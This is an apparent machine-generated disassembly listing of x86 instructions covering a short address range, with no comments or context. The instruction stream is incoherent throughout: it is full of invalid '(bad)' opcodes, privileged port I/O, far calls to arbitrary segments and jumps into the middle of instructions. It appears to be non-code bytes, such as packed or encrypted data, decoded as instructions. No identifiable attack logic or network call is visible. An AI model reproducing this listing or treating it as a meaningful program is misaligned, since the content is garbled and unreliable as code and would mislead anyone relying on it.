  41ffce:	mov    edi,0x467bdeaa
  41ffd3:	call   0x8408c35b
  41ffd8:	scas   eax,DWORD PTR es:[edi]
  41ffd9:	nop
  41ffda:	mov    ah,0xd9
  41ffdc:	loope  0x41ff73
  41ffde:	xchg   edx,eax
  41ffdf:	mov    dl,0x4a
  41ffe1:	mov    ebp,0xb2af6f84
  41ffe6:	dec    esp
  41ffe7:	cmp    BYTE PTR [ebx],0x98
  41ffea:	adc    al,0xf8
  41ffec:	jle    0x41ff7f
  41ffee:	jl     0x41ff8e
  41fff0:	out    dx,al
  41fff1:	retf   0x13e6
  41fff4:	xlat   BYTE PTR ds:[ebx]
  41fff5:	xchg   ebx,eax
  41fff6:	sahf   
  41fff7:	xchg   ebx,eax
  41fff8:	and    DWORD PTR [esi],0xffffffb5
  41fffb:	adc    edi,DWORD PTR [ebp+0x43a1bf2]
  420001:	push   ebx
  420002:	enter  0x5bff,0x3
  420006:	out    0xfc,eax
  420008:	out    0x42,eax
  42000a:	add    dl,BYTE PTR [ecx-0x9]
  42000d:	or     BYTE PTR ds:0x191f53f4,0x82
  420014:	xchg   ebp,eax
  420015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420016:	enter  0x271f,0x62
  42001a:	mov    al,ds:0x7ffadf7b
  42001f:	xchg   ecx,eax
  420020:	dec    esi
  420021:	xchg   ecx,eax
  420022:	mov    esp,0x486e9dc4
  420027:	cdq    
  420028:	push   edi
  420029:	in     al,0xac
  42002b:	jbe    0x420072
  42002d:	sub    ecx,DWORD PTR [edx+eiz*1+0x6ea8e9bf]
  420034:	mov    esp,0x7c54d92a
  420039:	dec    eax
  42003a:	xchg   ebx,eax
  42003b:	repnz imul edx,DWORD PTR [ebx+eax*2],0x53
  420040:	push   eax
  420041:	or     eax,0xf99760ed
  420046:	sbb    al,0xe7
  420048:	(bad)  
  420049:	push   edi
  42004a:	mov    bh,0x27
  42004c:	not    al
  42004e:	jle    0x420045
  420050:	in     al,dx
  420051:	xchg   BYTE PTR [ecx+0x69],cl
  420054:	rcl    BYTE PTR [esi-0x54],cl
  420057:	nop
  420058:	lea    esp,[edx+0x2753219]
  42005e:	stc    
  42005f:	jecxz  0x4200a9
  420061:	mov    eax,0xc2cac6ba
  420066:	push   edx
  420067:	cmp    bh,BYTE PTR es:[eax]
  42006a:	mov    eax,0x510ea306
  42006f:	test   DWORD PTR [edx+0x40a4d364],edx
  420075:	and    DWORD PTR [edx-0x16],eax
  420078:	lods   al,BYTE PTR ds:[esi]
  420079:	adc    al,0xaa
  42007b:	add    ebp,ebp
  42007d:	sbb    BYTE PTR [ebp+0xd42ac01],dh
  420083:	push   cs
  420084:	call   0xddf47d76
  420089:	sub    al,0xb1
  42008b:	mov    edx,0x7353de85
  420090:	sbb    al,0x5c
  420092:	cmc    
  420093:	pop    ecx
  420094:	mov    bl,0xe7
  420096:	inc    edi
  420097:	in     eax,0x26
  420099:	fsubr  QWORD PTR [edi]
  42009b:	das    
  42009c:	pushf  
  42009d:	push   0xffffffd3
  42009f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200a0:	je     0x420103
  4200a2:	inc    ebp
  4200a3:	sub    BYTE PTR [edx-0x60],bl
  4200a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200a7:	sar    BYTE PTR [ebx],1
  4200a9:	jb     0x42004d
  4200ab:	mov    ah,0xb4
  4200ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200ae:	stc    
  4200af:	nop
  4200b0:	je     0x420105
  4200b2:	adc    esi,ebx
  4200b4:	(bad)  
  4200b5:	retf   
  4200b6:	dec    ebp
  4200b7:	ja     0x420084
  4200b9:	xchg   DWORD PTR [ebp+ecx*2+0x6ce6612e],edx
  4200c0:	pop    esp
  4200c1:	or     ebx,DWORD PTR [ecx-0x1732b53]
  4200c7:	mov    eax,0xeb5771bf
  4200cc:	push   0x931f6a7
  4200d1:	dec    eax
  4200d2:	stos   DWORD PTR es:[edi],eax
  4200d3:	loop   0x4200b7
  4200d5:	cmp    eax,0xc81efdcf
  4200da:	jg     0x420078
  4200dc:	or     cl,BYTE PTR ds:0xea43399f
  4200e2:	bound  edi,QWORD PTR [ebp-0x48]
  4200e5:	inc    edi
  4200e6:	add    al,0x7c
  4200e8:	jle    0x4200c6
  4200ea:	push   eax
  4200eb:	push   esi
  4200ec:	(bad)  
  4200ed:	lahf   
  4200ee:	mov    ch,0x30
  4200f0:	nop
  4200f1:	imul   edi,DWORD PTR [ebx+eiz*2+0x63525b2],0x1db99a06
  4200fc:	mov    eax,0xc11c7325
  420101:	cld    
  420102:	dec    ebp
  420103:	cmp    ecx,edi
  420105:	dec    eax
  420106:	iret   
  420107:	cmp    bl,BYTE PTR [eax+ecx*4]
  42010a:	xor    eax,0x99e93312
  42010f:	cld    
  420110:	inc    ecx
  420111:	pushf  
  420112:	daa    
  420113:	push   ds
  420114:	mov    dh,BYTE PTR [esi]
  420116:	xor    DWORD PTR [ebx-0x1b],ebx
  420119:	jp     0x42019a
  42011b:	jmp    0x42011f
  42011d:	or     BYTE PTR [ecx+0x68ae6ad3],bl
  420123:	leave  
  420124:	add    ch,BYTE PTR [ecx-0x547d3765]
  42012a:	retf   
  42012b:	jb     0x4200ce
  42012d:	call   FWORD PTR [edi]
  42012f:	adc    ch,BYTE PTR [edi]
  420131:	add    ah,BYTE PTR [esi-0x48]
  420134:	jno    0x4201b0
  420136:	add    eax,ebx
  420138:	or     esi,DWORD PTR [eax]
  42013a:	arpl   WORD PTR [esi+eiz*8-0x5d],sp
  42013e:	loop   0x420154
  420140:	stc    
  420141:	repnz jecxz 0x420191
  420144:	sbb    BYTE PTR [edi+ebp*4-0x17f3819f],0xef
  42014c:	loope  0x4200dd
  42014e:	xchg   ebp,eax
  42014f:	or     bl,dl
  420151:	mov    esi,DWORD PTR [ebx-0xea6fcc2]
  420157:	push   ecx
  420158:	mov    edx,0x3e0b5724
  42015d:	out    dx,al
  42015e:	ins    DWORD PTR es:[edi],dx
  42015f:	popa   
  420160:	jle    0x4201ac
  420162:	icebp  
  420163:	enter  0x7430,0x1f
  420167:	fcmovb st,st(5)
  420169:	outs   dx,BYTE PTR ds:[esi]
  42016a:	sbb    al,0xad
  42016c:	push   ecx
  42016d:	mov    cl,0x4e
  42016f:	cmc    
  420170:	popf   
  420171:	xchg   ecx,eax
  420172:	es in  al,dx
  420174:	imul   eax,DWORD PTR ds:0xf4559e3b,0x52
  42017b:	mov    ah,0x27
  42017d:	dec    eax
  42017e:	adc    cl,BYTE PTR ss:[ebx+0x2a30db6f]
  420185:	cs aad 0xbe
  420188:	pop    esi
  420189:	adc    esi,DWORD PTR [eax]
  42018b:	mov    esi,DWORD PTR [edx]
  42018d:	sub    edi,DWORD PTR [edi-0x9]
  420190:	iret   
  420191:	mov    esp,DWORD PTR [eax]
  420193:	lods   eax,DWORD PTR es:[esi]
  420195:	push   ecx
  420196:	pop    eax
  420197:	push   esp
  420198:	ins    BYTE PTR es:[edi],dx
  420199:	cmp    al,0xe8
  42019b:	push   0x17
  42019d:	xchg   ebx,eax
  42019e:	xchg   esp,eax
  42019f:	or     ch,bh
  4201a1:	popa   
  4201a2:	dec    esp
  4201a3:	sbb    eax,DWORD PTR [ebp+ebp*1+0x39]
  4201a7:	rol    WORD PTR [ecx+0xcfee05f],cl
  4201ae:	mov    eax,0x25a01604
  4201b3:	cmp    eax,0xa050a495
  4201b8:	sub    eax,0xdfb6b904
  4201bd:	fwait
  4201be:	jle    0x420198
  4201c0:	das    
  4201c1:	jle    0x4201d1
  4201c3:	jle    0x4201e5
  4201c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201c6:	xchg   esi,ecx
  4201c8:	les    ecx,FWORD PTR [esi]
  4201ca:	mov    ebp,edi
  4201cc:	addr16 jo 0x420248
  4201cf:	mov    ah,0x14
  4201d1:	xor    DWORD PTR [eax-0x41],esi
  4201d4:	push   0xd
  4201d6:	push   esi
  4201d7:	xchg   WORD PTR [ebx+0x1759d86e],dx
  4201de:	sbb    eax,0x401f4cd2
  4201e3:	or     eax,0xd008fedc
  4201e8:	jmp    0xa671:0xeb2e9e60
  4201ef:	sar    BYTE PTR [ecx+0x47],1
  4201f2:	pop    eax
  4201f3:	cmp    eax,0x26d6b0
  4201f8:	push   ds
  4201f9:	push   es
  4201fa:	add    ebx,DWORD PTR [ebx]
  4201fc:	add    DWORD PTR [ebx],ecx
  4201fe:	mov    dh,0x8c
  420200:	sbb    edx,DWORD PTR [ecx-0x6428cddb]
  420206:	lods   al,BYTE PTR ds:[esi]
  420207:	inc    edx
  420208:	outs   dx,BYTE PTR ds:[esi]
  420209:	stc    
  42020a:	stos   BYTE PTR es:[edi],al
  42020b:	mov    eax,ds:0x723de931
  420210:	cmp    al,BYTE PTR [eax+0x7b]
  420213:	aaa    
  420214:	call   0x635e:0xe6de34bf
  42021b:	mov    bl,BYTE PTR [ebx]
  42021d:	jecxz  0x420218
  42021f:	sub    edx,DWORD PTR gs:[ebp+0xaf6ea47]
  420226:	xchg   ecx,eax
  420227:	dec    ecx
  420228:	dec    edx
  420229:	jge    0x420217
  42022b:	and    eax,0x1a444f6d
  420230:	ret    0xdcc7
  420233:	ret    0xe927
  420236:	pop    es
  420237:	pop    es
  420238:	fist   DWORD PTR [ebx]
  42023a:	imul   edi,DWORD PTR [ecx-0x59209fc0],0x69
  420241:	(bad)  
  420242:	mov    al,0x3e
  420244:	rol    DWORD PTR [esi],0x81
  420247:	push   edi
  420248:	pushf  
  420249:	pop    ds
  42024a:	pop    esp
  42024b:	je     0x4202c0
  42024d:	mov    eax,ds:0xbb6f870
  420252:	pop    ebp
  420253:	int3   
  420254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420255:	jne    0x42026b
  420257:	sub    bl,bh
  420259:	jne    0x42021e
  42025b:	rol    al,0xaf
  42025e:	sub    eax,0x5c28e516
  420263:	dec    edi
  420264:	lock inc edi
  420266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420267:	jmp    DWORD PTR [edi]
  420269:	aas    
  42026a:	pop    ecx
  42026b:	jb     0x420271
  42026d:	stc    
  42026e:	popf   
  42026f:	addr16 popf 
  420271:	sar    BYTE PTR [ebp-0x57],1
  420274:	ret    0x7be5
  420277:	sti    
  420278:	push   ecx
  420279:	ins    DWORD PTR es:[edi],dx
  42027a:	repz bound edx,QWORD PTR [esi-0x5cbd7add]
  420281:	xor    DWORD PTR [ebx],ebp
  420283:	push   esi
  420284:	out    0xcd,al
  420286:	jmp    0xae6ee01a
  42028b:	inc    edi
  42028c:	call   0xcf1c8d01
  420291:	jl     0x420311
  420293:	jno    0x42024e
  420295:	ficomp DWORD PTR [esi-0x69368653]
  42029b:	add    dl,dl
  42029d:	push   esi
  42029e:	dec    edi
  42029f:	mov    WORD PTR [esp],ds
  4202a2:	push   ds
  4202a3:	(bad)  
  4202a4:	mov    ecx,0x9f39804c
  4202a9:	fdivr  QWORD PTR [esi]
  4202ab:	sbb    al,0xe4
  4202ad:	retf   
  4202ae:	cmp    al,0x6b
  4202b0:	sbb    eax,0x12f5fb67
  4202b5:	or     ecx,DWORD PTR [eax]
  4202b7:	neg    BYTE PTR ds:0x89b2f2f9
  4202bd:	fs fs int 0x7f
  4202c1:	pop    ebx
  4202c2:	aas    
  4202c3:	pop    eax
  4202c4:	xchg   esi,eax
  4202c5:	sahf   
  4202c6:	adc    al,0xd4
  4202c8:	jnp    0x420308
  4202ca:	imul   edi
  4202cc:	mov    ch,ah
  4202ce:	mov    bl,0x84
  4202d0:	in     al,0x8f
  4202d2:	mov    cs,eax
  4202d4:	lods   eax,DWORD PTR ds:[esi]
  4202d5:	adc    al,0xaf
  4202d7:	fstp   QWORD PTR [esi-0x46]
  4202da:	fcom   QWORD PTR [edx]
  4202dc:	inc    ecx
  4202dd:	shl    cl,0xe7
  4202e0:	lea    ecx,[edx-0x9fbcbf]
  4202e6:	call   0x3fe:0x7f6e0419
  4202ed:	mov    ebx,0xdb43926f
  4202f2:	in     eax,0x21
  4202f4:	mov    ch,BYTE PTR es:0x49b9b8d6
  4202fb:	popf   
  4202fc:	pop    edi
  4202fd:	rcl    DWORD PTR [esi+eax*1],cl
  420300:	(bad)  
  420301:	(bad)  
  420302:	fsubr  QWORD PTR [esi]
  420304:	and    al,BYTE PTR [eax-0x3460a9ce]
  42030a:	push   0xe1ca9158
  42030f:	les    edi,FWORD PTR [eax]
  420311:	push   0xa410c3ed
  420316:	cmp    DWORD PTR [edx+0x5b],edx
  420319:	int    0x2c
  42031b:	ret    0x2027
  42031e:	add    DWORD PTR [edx+0x19],edi
  420321:	int    0x3c
  420323:	cs js  0x420358
  420326:	out    dx,al
  420327:	sbb    dl,BYTE PTR [esi]
  420329:	std    
  42032a:	test   eax,0xb747e2ea
  42032f:	inc    ebx
  420330:	and    DWORD PTR [esi+0x493e3364],ebp
  420336:	es xchg ebx,eax
  420338:	cld    
  420339:	test   DWORD PTR [ecx-0x2a],edi
  42033c:	inc    esi
  42033d:	dec    edi
  42033e:	(bad)  
  42033f:	int    0xd9
  420341:	repz not ah
  420344:	mov    esi,0xbd70c984
  420349:	push   ss
  42034a:	mov    dl,0xaa
  42034c:	inc    ecx
  42034d:	pop    ecx
  42034e:	push   0xffffffe2
  420350:	test   cl,ah
  420352:	jo     0x420304
  420354:	shl    DWORD PTR [ebx+0x74],0xed
  420358:	pusha  
  420359:	fstp   TBYTE PTR ds:0xe15ff160
  42035f:	cmp    eax,0xab1fb7de
  420364:	popa   
  420365:	jo     0x420349
  420367:	mov    es,edi
  420369:	xchg   ecx,eax
  42036a:	lods   al,BYTE PTR ds:[esi]
  42036b:	sub    ebp,esp
  42036d:	loop   0x4202f6
  42036f:	into   
  420370:	push   es
  420371:	add    ebp,esp
  420373:	inc    edx
  420374:	pop    ds
  420375:	sub    dh,BYTE PTR [edx+esi*1]
  420378:	leave  
  420379:	mov    ds:0x2b137cc,al
  42037e:	loopne 0x4203fa
  420380:	addr16 inc ebp
  420382:	jecxz  0x42036b
  420384:	out    dx,eax
  420385:	scas   eax,DWORD PTR es:[edi]
  420386:	sub    edi,DWORD PTR [ebx-0xf]
  420389:	bndldx (bad),ss:[esi+0x74]
  42038e:	fld    QWORD PTR [ecx-0x4c9a6e6f]
  420394:	mov    ebx,0x12d3d6c1
  420399:	jno    0x4203be
  42039b:	pop    ecx
  42039c:	test   eax,0xad7026a1
  4203a1:	sbb    eax,0x7f338b64
  4203a6:	data16 mov ds:0xcf630723,al
  4203ac:	fwait
  4203ad:	mov    ebp,0xd31c8fe6
  4203b2:	sub    esi,DWORD PTR [eax-0x49]
  4203b5:	mov    dh,0x77
  4203b7:	into   
  4203b8:	adc    eax,0x1bf3bcdf
  4203bd:	repz push esp
  4203bf:	adc    DWORD PTR [ebx],esp
  4203c1:	sbb    eax,DWORD PTR ds:0xab21c295
  4203c7:	shl    edi,cl
  4203c9:	adc    DWORD PTR [edi+0x26101e27],esp
  4203cf:	pop    ebp
  4203d0:	xor    esi,esp
  4203d2:	hlt    
  4203d3:	xlat   BYTE PTR ds:[ebx]
  4203d4:	loop   0x4203fc
  4203d6:	sub    ecx,DWORD PTR [edi]
  4203d8:	cmp    DWORD PTR [eax-0x5bd64a9],esi
  4203de:	fisub  DWORD PTR [edi]
  4203e0:	push   esi
  4203e1:	call   0x1d91:0x49fbe8ec
  4203e8:	cmp    eax,0xed104d38
  4203ed:	arpl   WORD PTR [ebx+0x3d3a57b5],si
  4203f3:	dec    ebp
  4203f4:	inc    eax
  4203f5:	jge    0x420461
  4203f7:	mov    esp,0x2f869175
  4203fc:	scas   al,BYTE PTR es:[edi]
  4203fd:	cld    
  4203fe:	imul   edx,esi,0xd7f0c790
  420404:	stos   BYTE PTR es:[edi],al
  420405:	add    BYTE PTR [edx+0x70],cl
  420408:	shr    bl,1
  42040a:	(bad)  
  42040b:	and    esi,DWORD PTR [esi+0x4da183e5]
  420411:	call   FWORD PTR [ebx-0x6f]
  420414:	out    0x37,eax
  420416:	pop    esp
  420417:	mov    ch,0xf6
  420419:	add    eax,ecx
  42041b:	inc    eax
  42041c:	fs inc esi
  42041e:	adc    DWORD PTR [esi+ebx*1+0x1d],edi
  420422:	mov    edi,0xb654414
  420427:	adc    DWORD PTR [esi],edi
  420429:	jge    0x42049d
  42042b:	mov    bh,0xb9
  42042d:	push   eax
  42042e:	sbb    ecx,eax
  420430:	pop    esi
  420431:	xlat   BYTE PTR ds:[ebx]
  420432:	test   al,ah
  420434:	mov    al,0x77
  420436:	jg     0x4204a3
  420438:	fisttp QWORD PTR [edi-0x2f775d16]
  42043e:	pop    ds
  42043f:	mov    ebx,0x8d4249fb
  420444:	sar    BYTE PTR [ebx+0x3d],1
  420447:	add    BYTE PTR [esi+edi*4-0x2c9c5be0],dh
  42044e:	and    cl,BYTE PTR [esi]
  420450:	mov    cl,0x2d
  420452:	xor    DWORD PTR [ebp+0x298c24bd],eax
  420458:	sub    DWORD PTR [ebx+0x7ee75e66],edx
  42045e:	jp     0x4204a7
  420460:	dec    ebp
  420461:	ins    BYTE PTR es:[edi],dx
  420462:	pop    eax
  420463:	aaa    
  420464:	cmp    dl,bh
  420466:	mov    gs,WORD PTR [eax+ebx*4]
  420469:	mov    eax,0xedd2af0f
  42046e:	mov    cl,ah
  420470:	xchg   ecx,eax
  420471:	ficomp DWORD PTR [ebx-0x4e849cc3]
  420477:	not    DWORD PTR [ebx+0x2b]
  42047a:	fst    st(4)
  42047c:	popf   
  42047d:	jo     0x42043d
  42047f:	mov    cl,0x3c
  420481:	mov    al,ds:0xf5a91d75
  420486:	mov    bh,0xc3
  420488:	aaa    
  420489:	xlat   BYTE PTR ds:[ebx]
  42048a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42048b:	popf   
  42048c:	sub    DWORD PTR [esi-0x64778f2],0x12cd56e8
  420496:	popf   
  420497:	pop    es
  420498:	and    DWORD PTR [esi+0x1a21821d],esp
  42049e:	ins    BYTE PTR es:[edi],dx
  42049f:	cmp    DWORD PTR [edi-0x4a],edi
  4204a2:	mov    bh,ch
  4204a4:	cmp    ebx,DWORD PTR [eax-0x38b09a95]
  4204aa:	leave  
  4204ab:	pop    ecx
  4204ac:	jl     0x42051d
  4204ae:	(bad)  [eax-0x22]
  4204b1:	inc    esp
  4204b2:	mov    esp,0x397bef77
  4204b7:	cli    
  4204b8:	inc    esp
  4204b9:	mov    edx,0xcd38c851
  4204be:	(bad)  [esi+0x670acdf3]
  4204c4:	arpl   WORD PTR [esi-0x500da76a],bp
  4204ca:	pushf  
  4204cb:	scas   al,BYTE PTR es:[edi]
  4204cc:	ja     0x420504
  4204ce:	cdq    
  4204cf:	cwde   
  4204d0:	int3   
  4204d1:	aas    
  4204d2:	add    DWORD PTR [ebx],ebp
  4204d4:	fild   DWORD PTR [ebx+0x3d5aa2b7]
  4204da:	jmp    0x7b61:0x5260d278
  4204e1:	add    al,0xcc
  4204e3:	add    DWORD PTR [edx],eax
  4204e5:	mov    edx,0xc9f2e23f
  4204ea:	pop    edi
  4204eb:	xor    al,0x92
  4204ed:	daa    
  4204ee:	and    al,BYTE PTR [ebx+0x72]
  4204f1:	pop    edx
  4204f2:	cmp    BYTE PTR [eax+0x3e],dl
  4204f5:	(bad)  
  4204f6:	into   
  4204f7:	jmp    0x6423cfb4
  4204fc:	dec    ebp
  4204fd:	sub    bh,BYTE PTR [ecx-0x17]
  420500:	gs adc eax,0xdce1dc1e
  420506:	xor    ecx,ebp
  420508:	push   ds
  420509:	jne    0x42056c
  42050b:	inc    ebp
  42050c:	and    cl,bl
  42050e:	fild   DWORD PTR [edi-0x7130d948]
  420514:	push   ebp
  420515:	mov    al,0xc
  420517:	fstp   DWORD PTR [eax-0x6fb20ddc]
  42051d:	add    DWORD PTR [ebx],eax
  42051f:	xadd   BYTE PTR [eax],dl
  420522:	xchg   DWORD PTR [esp+ebp*4+0x7599019b],esi
  420529:	jno    0x420559
  42052b:	xor    eax,0x860a5e61
  420530:	inc    edx
  420531:	inc    ebx
  420532:	mov    ds,WORD PTR [eax]
  420534:	jmp    0x420507
  420536:	cmp    ebp,esi
  420538:	and    dl,BYTE PTR [ebp+0x4987efb5]
  42053e:	scas   eax,DWORD PTR es:[edi]
  42053f:	data16 mov al,0x76
  420542:	or     eax,0xafac0dcf
  420547:	popa   
  420548:	jmp    0xf4c70e9d
  42054d:	shl    BYTE PTR ds:0x8a647632,0x4e
  420554:	mov    bl,0x4a
  420556:	jo     0x4204f3
  420558:	adc    BYTE PTR [esp+esi*2],bh
  42055b:	fsub   QWORD PTR [esi+0x18]
  42055e:	ins    DWORD PTR es:[edi],dx
  42055f:	fdiv   DWORD PTR [esi-0x711c925e]
  420565:	mov    WORD PTR [ebx+ebx*2+0x7e],?
  420569:	int    0x22
  42056b:	jp     0x42057b
  42056d:	fdiv   st(2),st
  42056f:	dec    esp
  420570:	cmc    
  420571:	popf   
  420572:	ss pop edi
  420574:	and    dh,BYTE PTR [edx]
  420576:	fs mov dl,0xc5
  420579:	enter  0x2143,0xef
  42057d:	neg    DWORD PTR [edi+0x6f]
  420580:	push   ebx
  420581:	call   0xb58ce37a
  420586:	std    
  420587:	push   0xfffffff5
  420589:	or     ebx,0xfffffff4
  42058c:	add    BYTE PTR [edi-0x2f6e211e],ch
  420592:	or     ebp,DWORD PTR [ebx+0x1adaf311]
  420598:	int    0x5f
  42059a:	dec    ecx
  42059b:	(bad)
  42059e:	xor    BYTE PTR [edi-0x3b41f850],dh
  4205a4:	fs dec edx
  4205a6:	inc    esi
  4205a7:	mov    dh,0xea
  4205a9:	pop    ds
  4205aa:	jne    0x420615
  4205ac:	jp     0x420605
  4205ae:	sub    eax,0x4705b870
  4205b3:	out    0x12,eax
  4205b5:	cmp    ebx,DWORD PTR [edi+0x55]
  4205b8:	push   ds
  4205b9:	xchg   esp,eax
  4205ba:	out    0x29,eax
  4205bc:	hlt    
  4205bd:	ficom  DWORD PTR [ebp+0x7c34112c]
  4205c3:	pop    eax
  4205c4:	inc    eax
  4205c5:	jp     0x4205fb
  4205c7:	dec    ebx
  4205c8:	scas   al,BYTE PTR es:[edi]
  4205c9:	xor    al,0x12
  4205cb:	mov    esi,0xf689522f
  4205d0:	aaa    
  4205d1:	jo     0x420642
  4205d3:	popf   
  4205d4:	cmp    al,0x2c
  4205d6:	cmp    esp,ecx
  4205d8:	nop
  4205d9:	cmp    DWORD PTR [ebx+0x66cdc2a2],edx
  4205df:	dec    edi
  4205e0:	push   esi
  4205e1:	loop   0x4205fb
  4205e3:	lods   eax,DWORD PTR ds:[esi]
  4205e4:	adc    ebp,DWORD PTR [edx+0x6b]
  4205e7:	add    eax,DWORD PTR [edi+0x10]
  4205ea:	pop    ss
  4205eb:	mov    WORD PTR [ebp-0x817d40d],gs
  4205f1:	fstp   TBYTE PTR [eax+0x7f]
  4205f4:	fldcw  WORD PTR [eax+0x10]
  4205f7:	jmp    FWORD PTR [ebx-0xc95d0a0]
  4205fd:	std    
  4205fe:	(bad)  
  4205ff:	fcmovne st,st(6)
  420601:	pop    ebx
  420602:	pop    ebp
  420603:	inc    ebp
  420604:	test   BYTE PTR [eax-0x69],bh
  420607:	ins    DWORD PTR es:[edi],dx
  420608:	inc    ebx
  420609:	xchg   ecx,eax
  42060a:	push   esp
  42060b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42060c:	mov    edx,0xd951ceff
  420611:	push   esp
  420612:	arpl   WORD PTR [esi-0x1bcaf295],ax
  420618:	ins    DWORD PTR es:[edi],dx
  420619:	or     esi,edx
  42061b:	int    0x44
  42061d:	aam    0x26
  42061f:	cmp    edx,DWORD PTR [edx-0x7d8521f8]
  420625:	test   DWORD PTR [ecx-0x26],ebx
  420628:	enter  0xf28c,0x84
  42062c:	loop   0x4205b6
  42062e:	dec    edi
  42062f:	ret    
  420630:	xchg   esi,eax
  420631:	cmc    
  420632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420633:	sahf   
  420634:	in     eax,0xe7
  420636:	into   
  420637:	and    eax,0x198c24ae
  42063c:	adc    eax,0x6d5562b0
  420641:	aad    0xe4
  420643:	xor    esi,esp
  420645:	xchg   DWORD PTR [eax],ebp
  420647:	pushf  
  420648:	or     edx,eax
  42064a:	jae    0x42068d
  42064c:	cmc    
  42064d:	nop
  42064e:	call   0xbd67:0xf5a313b1
  420655:	mov    bl,0xe0
  420657:	scas   eax,DWORD PTR es:[edi]
  420658:	popf   
  420659:	or     BYTE PTR [ebp-0x272f263a],cl
  42065f:	jmp    0x4206a8
  420661:	hlt    
  420662:	and    eax,0xd29e1fcb
  420667:	dec    ebp
  420668:	cdq    
  420669:	dec    ebp
  42066a:	jg     0x420629
  42066c:	shl    DWORD PTR [eax],1
  42066e:	es je  0x42062a
  420671:	xor    edi,esi
  420673:	imul   edi,DWORD PTR [eax],0xbbd57393
  420679:	call   0xd1e1:0xa6d56a63
  420680:	in     eax,0x5f
  420682:	leave  
  420683:	cmp    bl,BYTE PTR [edx]
  420685:	sub    eax,0x78febe31
  42068a:	mul    DWORD PTR [eax-0x5fe8fc3a]
  420690:	add    BYTE PTR [ecx-0x136a5d9e],dl
  420696:	pusha  
  420697:	outs   dx,BYTE PTR ds:[esi]
  420698:	push   0xaf412946
  42069d:	inc    esp
  42069e:	xchg   ebx,eax
  42069f:	lock mov cl,0x7d
  4206a2:	adc    ebx,DWORD PTR ds:0x7e210ae3
  4206a8:	push   edx
  4206a9:	inc    edi
  4206aa:	adc    edi,ebx
  4206ac:	xchg   ebp,eax
  4206ad:	retf   0x59b4
  4206b0:	cli    
  4206b1:	xor    DWORD PTR [edi],0xfffffff2
  4206b4:	xor    eax,0xc3df869e
  4206b9:	dec    ebp
  4206ba:	inc    ebp
  4206bb:	call   0x551437a7
  4206c0:	in     eax,dx
  4206c1:	pop    eax
  4206c2:	inc    edx
  4206c3:	int    0x45
  4206c5:	into   
  4206c6:	sub    ah,BYTE PTR [esi-0x2dab3f04]
  4206cc:	or     ah,BYTE PTR [esi-0x75]
  4206cf:	cdq    
  4206d0:	(bad)  
  4206d1:	xchg   ecx,eax
  4206d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206d3:	jecxz  0x4206c2
  4206d5:	jnp    0x420712
  4206d7:	pop    ecx
  4206d8:	jne    0x4206fe
  4206da:	sbb    esi,edi
  4206dc:	add    eax,0x37242fce
  4206e1:	push   0x8c3d331d
  4206e6:	xor    ah,0xab
  4206e9:	or     DWORD PTR [edi],eax
  4206eb:	shl    DWORD PTR [eax+0x214a4286],cl
  4206f1:	cli    
  4206f2:	scas   al,BYTE PTR es:[edi]
  4206f3:	mov    bh,0x3e
  4206f5:	outs   dx,DWORD PTR ds:[esi]
  4206f6:	pop    ds
  4206f7:	sub    BYTE PTR [ebx-0x34],0xf9
  4206fb:	out    dx,al
  4206fc:	dec    edx
  4206fd:	and    eax,0x6b2c2498
  420702:	mov    DWORD PTR [edx+edx*2-0x6e],ecx
  420706:	adc    al,0x15
  420708:	inc    ebx
  420709:	and    cl,BYTE PTR [eax-0x5e320171]
  42070f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420710:	mov    edi,0x2888f2dd
  420715:	out    0x17,al
  420717:	ret    0xe651
  42071a:	std    
  42071b:	fisubr DWORD PTR [ebx+0x8]
  42071e:	jb     0x420709
  420720:	xchg   esp,eax
  420721:	mov    eax,0x52ee4139
  420726:	jo     0x42076e
  420728:	aam    0x43
  42072a:	ins    DWORD PTR es:[edi],dx
  42072b:	out    0x95,al
  42072d:	push   es
  42072e:	mov    ds:0x7a92bda6,al
  420733:	imul   BYTE PTR [esi]
  420735:	xor    edx,DWORD PTR [edx+0x45]
  420738:	daa    
  420739:	or     BYTE PTR [eax+0x70],ah
  42073c:	mov    al,ds:0x44b94200
  420741:	jmp    0x417ad74e
  420746:	leave  
  420747:	mov    esp,0x58ab6273
  42074c:	mov    al,ds:0xc47d7ede
  420751:	mov    al,0xa4
  420753:	enter  0x6d5a,0x99
  420757:	pop    ebp
  420758:	sub    BYTE PTR [edi+0x16],bh
  42075b:	dec    ebp
  42075c:	fwait
  42075d:	xor    DWORD PTR [ecx+0x6],ebx
  420760:	jecxz  0x4207dd
  420762:	xor    DWORD PTR [edi],esi
  420764:	add    al,0xfd
  420766:	std    
  420767:	adc    BYTE PTR [ecx+0x78],bh
  42076a:	sbb    al,0x2a
  42076c:	in     eax,dx
  42076d:	fistp  WORD PTR [edi+ebx*8]
  420770:	jb     0x4207dc
  420772:	scas   al,BYTE PTR es:[edi]
  420773:	dec    edi
  420774:	sti    
  420775:	out    0x7,al
  420777:	or     esi,esi
  420779:	jecxz  0x42072b
  42077b:	sub    DWORD PTR [ebx-0x72f8d26f],ecx
  420781:	cs cld 
  420783:	ret    0xf1dd
  420786:	bound  edx,QWORD PTR [esi-0x7b]
  420789:	jg     0x420804
  42078b:	or     dl,BYTE PTR [ebp-0x4c]
  42078e:	xchg   BYTE PTR [ebx-0x1fa11920],dh
  420794:	xor    eax,0x436a8b8d
  420799:	mov    edx,DWORD PTR [edi-0x2f]
  42079c:	hlt    
  42079d:	fisttp WORD PTR [edx+0x4b5098ad]
  4207a3:	add    ch,ch
  4207a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207a6:	inc    eax
  4207a7:	jbe    0x420820
  4207a9:	xchg   ecx,eax
  4207aa:	pushf  
  4207ab:	imul   edx,DWORD PTR [ecx],0x6
  4207ae:	sub    al,BYTE PTR [ebx+0x39]
  4207b1:	test   DWORD PTR [edx],0x15c032f5
  4207b7:	ret    
